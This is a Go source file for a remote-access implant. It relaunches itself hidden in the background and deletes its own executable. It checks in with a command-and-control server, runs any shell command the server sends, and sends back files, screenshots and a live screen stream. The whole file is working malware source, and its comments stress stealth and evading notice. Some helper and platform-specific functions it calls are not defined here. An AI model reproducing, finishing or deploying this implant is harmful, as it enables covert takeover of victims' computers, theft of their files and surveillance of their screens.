package main

import (
	"bytes"
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

//go:embed placeholder.txt
var implantIDBytes []byte

//go:embed c2_address.txt
var c2AddressBytes []byte

const (
	implantIDPlaceholder = "deadbeef-0000-0000-0000-000000000000"
	c2AddressPlaceholder = "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX"
	checkInInterval      = 5 * time.Second
	livestreamInterval   = 1 * time.Second
	backgroundMarkerArg  = "--implant-is-now-very-stealthy-and-happy" // Argument to identify background process
)

var (
	checkInURL         string
	commandsURL        string
	commandResultURL   string
	livestreamFrameURL string

	// Global state for livestreaming
	isLivestreamActive bool
	stopLivestreamChan chan struct{}
)

// Declarations for platform-specific functions (defined in other files)
var doSelfDelete func(exePath string)
var setOSSpecificAttrs func(cmd *exec.Cmd)
var takeScreenshot func() (string, error)
var relaunchAsDaemonInternal func(exePath string, args []string) error // New: for daemonizing

// implantID extracts the unique implant token.
func implantID() string {
	s := string(implantIDBytes)
	if nullIdx := strings.IndexByte(s, 0); nullIdx != -1 {
		s = s[:nullIdx]
	}
	return strings.TrimSpace(s)
}

// c2ServerAddress extracts the C2 server address.
func c2ServerAddress() string {
	s := string(c2AddressBytes)
	if nullIdx := strings.IndexByte(s, 0); nullIdx != -1 {
		s = s[:nullIdx]
	}
	return strings.TrimSpace(s)
}

type FileSystemEntry struct {
	Name        string    `json:"name"`
	IsDir       bool      `json:"is_dir"`
	Size        int64     `json:"size"` // Meaningful for files
	ModTime     time.Time `json:"mod_time"`
	Permissions string    `json:"permissions"` // e.g., "drwxr-xr-x"
	Path        string    `json:"path"`        // Full path of the entry
}

type FileSystemListing struct {
	RequestedPath string            `json:"requested_path"`
	Entries       []FileSystemEntry `json:"entries"`
	Error         string            `json:"error,omitempty"` // If an error occurred listing
}

type Command struct {
	ID      int    `json:"id"`
	Command string `json:"command"`
}

type CheckInPayload struct {
	ImplantID string `json:"implant_id"`
	IPAddress string `json:"ip_address"`
	PWD       string `json:"pwd"`
}

type CommandResultPayload struct {
	CommandID int    `json:"command_id"`
	Output    string `json:"output"`
}

type LivestreamFramePayload struct {
	ImplantID string `json:"implant_id"`
	FrameData string `json:"frame_data"`
}

// Helper to call the platform-specific relaunch function
func relaunchAsDaemon(exePath string, args []string) error {
	if relaunchAsDaemonInternal != nil {
		return relaunchAsDaemonInternal(exePath, args)
	}
	// Fallback or error if not implemented for the platform (should be caught by build tags)
	return fmt.Errorf("relaunchAsDaemonInternal not implemented for this platform: %s", runtime.GOOS)
}

func initializeConfig() bool {
	currentImplantID := implantID()
	currentC2Address := c2ServerAddress()

	if currentImplantID == "" || currentImplantID == implantIDPlaceholder {
		fmt.Println("Error: Implant ID not properly set.")
		return false
	}
	if currentC2Address == "" || currentC2Address == c2AddressPlaceholder {
		fmt.Println("Error: C2 Address not properly set.")
		return false
	}

	c2BaseURL := currentC2Address
	if !strings.HasPrefix(c2BaseURL, "http://") && !strings.HasPrefix(c2BaseURL, "https://") {
		c2BaseURL = "http://" + c2BaseURL
	}

	checkInURL = fmt.Sprintf("%s/checkin", c2BaseURL)
	commandsURL = fmt.Sprintf("%s/implant-client/%s/commands", c2BaseURL, currentImplantID)
	commandResultURL = fmt.Sprintf("%s/command-result", c2BaseURL)
	livestreamFrameURL = fmt.Sprintf("%s/livestream-frame", c2BaseURL)
	return true
}

func main() {
	exePath, err := os.Executable()
	if err != nil {
		// If we can't get exePath, self-delete and daemonization might be problematic.
		// For stealth, simply exit or sleep.
		// fmt.Fprintf(os.Stderr, "Failed to get executable path: %v\n", err)
		time.Sleep(10 * time.Second) // Behave like a failed generic app
		return
	}

	isBackgroundProcess := false
	for _, arg := range os.Args {
		if arg == backgroundMarkerArg {
			isBackgroundProcess = true
			break
		}
	}

	if !isBackgroundProcess {
		// --- This is the initial execution. Relaunch self in background. ---
		var newArgs []string
		// Pass through original args, excluding the program name itself (os.Args[0])
		// and ensure our marker is not duplicated.
		if len(os.Args) > 1 {
			for _, arg := range os.Args[1:] {
				if arg != backgroundMarkerArg {
					newArgs = append(newArgs, arg)
				}
			}
		}
		newArgs = append(newArgs, backgroundMarkerArg)

		relaunchErr := relaunchAsDaemon(exePath, newArgs)
		if relaunchErr != nil {
			// For stealth, probably just exit. Logging to stderr might be undesirable.
			// fmt.Fprintf(os.Stderr, "Failed to relaunch as daemon: %v\n", relaunchErr)
			os.Exit(1) // Indicate an error subtly
		}
		// fmt.Println("Initial process: Relaunched in background. Exiting.")
		os.Exit(0) // Initial process exits successfully, returning control to terminal.
	}

	// --- If we reach here, we ARE the background process. ---
	// fmt.Println("Background process started. Scheduling self-delete.")

	// Schedule self-deletion of this background process's executable.
	// The doSelfDelete function is now implemented to use a grandchild process.
	if doSelfDelete != nil {
		doSelfDelete(exePath)
	} else {
		// This case should ideally not happen if platform files are correctly set up.
		// fmt.Fprintf(os.Stderr, "Warning: doSelfDelete function not implemented for this platform.\n")
	}

	if !initializeConfig() {
		// fmt.Println("Background process: Failed to initialize config. Exiting after delay.")
		time.Sleep(10 * time.Second) // Exit if config fails, after a delay.
		return
	}

	// fmt.Println("Background process: Config initialized. Starting main loop.")
	for {
		checkIn()
		fetchAndExecuteCommands()
		time.Sleep(checkInInterval)
	}
}

func checkIn() {
	if isLivestreamActive { // If livestreaming, frames act as keep-alive
		return
	}
	currentPwd, err := os.Getwd()
	if err != nil {
		currentPwd = "error_getting_pwd: " + err.Error()
	}
	payload := CheckInPayload{
		ImplantID: implantID(),
		IPAddress: "", // C2 can derive this from request
		PWD:       currentPwd,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return
	}
	resp, err := http.Post(checkInURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func fetchAndExecuteCommands() {
	resp, err := http.Get(commandsURL)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	var respStruct struct {
		Commands []Command `json:"commands"`
	}
	if err := json.Unmarshal(body, &respStruct); err != nil {
		return
	}

	currentImplantID := implantID() // Cache for this loop iteration
	currentPwd, _ := os.Getwd()     // Get PWD once per command batch for prompt

	for _, cmdToExec := range respStruct.Commands {
		trimmedCmdStr := strings.TrimSpace(cmdToExec.Command)
		// Update PWD for each command context if necessary, though 'cd' handles its own update.
		// For simplicity, using PWD from start of fetchAndExecuteCommands for prompts.

		if strings.HasPrefix(trimmedCmdStr, "fs_browse ") {
			pathArgJSON := strings.TrimSpace(strings.TrimPrefix(trimmedCmdStr, "fs_browse "))
			var browseRequest struct {
				Path string `json:"path"`
			}

			if err := json.Unmarshal([]byte(pathArgJSON), &browseRequest); err != nil {
				// fmt.Printf("fs_browse: failed to unmarshal path as JSON ('%s'), treating as raw path: %v\n", pathArgJSON, err)
				browseRequest.Path = pathArgJSON
			}

			targetPath := browseRequest.Path
			if targetPath == "" {
				errorListing := FileSystemListing{
					RequestedPath: pathArgJSON,
					Error:         "fs_browse: path argument is empty or invalid JSON.",
				}
				jsonOutput, _ := json.Marshal(errorListing)
				sendOutput(cmdToExec.ID, string(jsonOutput))
				continue
			}

			if targetPath == "__ROOTS__" {
				listing, listErr := listRoots()
				if listErr != nil && listing.Error == "" {
					listing.Error = fmt.Sprintf("Error listing roots: %v", listErr)
				}
				jsonOutput, _ := json.Marshal(listing)
				sendOutput(cmdToExec.ID, string(jsonOutput))
			} else {
				listing, listErr := listDirectory(targetPath)
				if listErr != nil && listing.Error == "" {
					listing.Error = fmt.Sprintf("Error listing directory '%s': %v", targetPath, listErr)
				}
				jsonOutput, _ := json.Marshal(listing)
				sendOutput(cmdToExec.ID, string(jsonOutput))
			}
			continue
		}

		if strings.HasPrefix(trimmedCmdStr, "fs_download ") {
			pathArgJSON := strings.TrimSpace(strings.TrimPrefix(trimmedCmdStr, "fs_download "))
			var downloadRequest struct {
				Path string `json:"path"`
			}

			if err := json.Unmarshal([]byte(pathArgJSON), &downloadRequest); err != nil {
				sendOutput(cmdToExec.ID, fmt.Sprintf("fs_download: invalid path argument JSON: %v. Expected {\"path\":\"...\"}", err))
				continue
			}

			targetPath := downloadRequest.Path
			if targetPath == "" {
				sendOutput(cmdToExec.ID, "fs_download: path argument is empty.")
				continue
			}

			fileData, readErr := os.ReadFile(targetPath)
			if readErr != nil {
				sendOutput(cmdToExec.ID, fmt.Sprintf("fs_download: error reading file '%s': %v", targetPath, readErr))
				continue
			}
			encodedData := base64.StdEncoding.EncodeToString(fileData)
			sendOutput(cmdToExec.ID, "file_data_b64:"+encodedData)
			continue
		}

		if trimmedCmdStr == "livestream_start" {
			if isLivestreamActive {
				sendOutput(cmdToExec.ID, "Livestream is already active.")
			} else {
				isLivestreamActive = true
				stopLivestreamChan = make(chan struct{})
				go runLivestream(currentImplantID, stopLivestreamChan)
				sendOutput(cmdToExec.ID, "Livestream started.")
			}
			continue
		}

		if trimmedCmdStr == "livestream_stop" {
			if isLivestreamActive {
				isLivestreamActive = false
				if stopLivestreamChan != nil {
					close(stopLivestreamChan)
					stopLivestreamChan = nil
				}
				sendOutput(cmdToExec.ID, "Livestream stopped.")
			} else {
				sendOutput(cmdToExec.ID, "Livestream is not active.")
			}
			continue
		}

		if trimmedCmdStr == "screenshot" {
			outputBase64, ssErr := takeScreenshot()
			if ssErr != nil {
				sendOutput(cmdToExec.ID, fmt.Sprintf("Screenshot failed: %v", ssErr))
			} else {
				sendOutput(cmdToExec.ID, "screenshot_data:"+outputBase64)
			}
			continue
		}

		if strings.HasPrefix(trimmedCmdStr, "cd ") {
			targetDir := strings.TrimSpace(strings.TrimPrefix(trimmedCmdStr, "cd "))
			originalPwdForPrompt := currentPwd // PWD before 'cd' for the prompt
			if targetDir == "" {
				homeDir, homeErr := os.UserHomeDir()
				if homeErr != nil {
					sendOutput(cmdToExec.ID, fmt.Sprintf("%s $ %s\ncd: Could not determine home directory: %s", originalPwdForPrompt, cmdToExec.Command, homeErr.Error()))
					continue
				}
				targetDir = homeDir
			}
			targetDir = os.ExpandEnv(targetDir) // Expand environment variables like $HOME or %USERPROFILE%
			cdErr := os.Chdir(targetDir)
			newPwd, _ := os.Getwd() // Get new PWD after attempt
			currentPwd = newPwd     // Update currentPwd for subsequent commands in this batch
			prompt := fmt.Sprintf("%s $ %s\n", originalPwdForPrompt, cmdToExec.Command)
			if cdErr != nil {
				sendOutput(cmdToExec.ID, prompt+fmt.Sprintf("Error changing directory to '%s': %v", targetDir, cdErr))
			} else {
				sendOutput(cmdToExec.ID, prompt+fmt.Sprintf("Changed directory to: %s", newPwd))
			}
			continue
		}

		// Generic command execution
		var command *exec.Cmd
		if runtime.GOOS == "windows" {
			command = exec.Command("cmd", "/C", cmdToExec.Command)
		} else {
			command = exec.Command("sh", "-c", cmdToExec.Command)
		}
		command.Dir = currentPwd // Execute command in the current working directory
		if setOSSpecificAttrs != nil {
			setOSSpecificAttrs(command)
		}

		outputBytes, execErr := command.CombinedOutput()
		resultString := string(outputBytes)
		prompt := fmt.Sprintf("%s $ %s\n", currentPwd, cmdToExec.Command)
		if execErr != nil {
			resultString += "\nExecution Error: " + execErr.Error()
		}
		sendOutput(cmdToExec.ID, prompt+resultString)
	}
}

func sendOutput(cmdID int, output string) {
	payload := CommandResultPayload{
		CommandID: cmdID,
		Output:    output,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return
	}
	// Consider adding a timeout to http.Post
	client := http.Client{Timeout: 15 * time.Second}
	resp, err := client.Post(commandResultURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func runLivestream(implantToken string, localStopChan <-chan struct{}) {
	// fmt.Printf("[%s] Livestream goroutine started.\n", implantToken) // Debug
	ticker := time.NewTicker(livestreamInterval)
	defer ticker.Stop()
	// defer fmt.Printf("[%s] Livestream goroutine stopped.\n", implantToken) // Debug

	for {
		select {
		case <-ticker.C:
			if !isLivestreamActive { // Double check global state
				return
			}
			if takeScreenshot == nil { // Ensure screenshot func is available
				// fmt.Printf("[%s] Livestream: takeScreenshot not available for this platform.\n", implantToken) // Debug
				// Optionally stop livestream or send an error frame
				isLivestreamActive = false // Stop if capability is missing
				if stopLivestreamChan != nil {
					close(stopLivestreamChan)
				}
				return
			}
			outputBase64, err := takeScreenshot()
			if err != nil {
				// fmt.Printf("[%s] Livestream screenshot failed: %v\n", implantToken, err) // Debug
				continue // Skip this frame
			}
			sendLivestreamFrame(implantToken, outputBase64)

		case <-localStopChan:
			// fmt.Printf("[%s] Livestream goroutine: Received stop signal.\n", implantToken) // Debug
			return
		}
	}
}

func sendLivestreamFrame(implantToken string, base64Data string) {
	payload := LivestreamFramePayload{
		ImplantID: implantToken,
		FrameData: base64Data,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		// fmt.Printf("[%s] Error marshalling livestream frame: %v\n", implantToken, err) // Debug
		return
	}
	client := http.Client{Timeout: 5 * time.Second} // Shorter timeout for frames
	resp, err := client.Post(livestreamFrameURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		// fmt.Printf("[%s] Error sending livestream frame: %v\n", implantToken, err) // Debug
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		// bodyBytes, _ := io.ReadAll(resp.Body)
		// fmt.Printf("[%s] Error sending livestream frame, C2 status: %s, body: %s\n", implantToken, resp.Status, string(bodyBytes)) // Debug
	}
}

// listDirectory and listRoots remain the same as in your provided code.
// These functions are called by fetchAndExecuteCommands.
